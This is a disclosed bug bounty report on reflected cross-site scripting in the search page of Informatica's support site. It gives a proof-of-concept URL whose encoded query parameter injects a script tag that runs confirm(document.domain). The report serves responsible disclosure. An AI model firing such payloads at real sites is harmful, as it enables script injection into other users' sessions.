# [mysupport.informatica.com] - reflected XSS

## Report Details
- **Report ID**: 39069
- **URL**: https://hackerone.com/reports/39069
- **State**: Closed
- **Severity**: high
- **Submitted**: 2014-12-11T17:36:08.264Z
- **Disclosed**: 2023-10-05T04:59:07.705Z

## Reporter
- **Username**: mtk0308
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
mysupport.informatica.com has reflected XSS vulnerability.

I used browser is Firefox 34.0.5
PoC:
https://mysupport.informatica.com/search.jspa?q=zzz%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3B%3C%2Fscript%3E

thanks

## Attachments
- __________2014-12-12_2.33.19.png
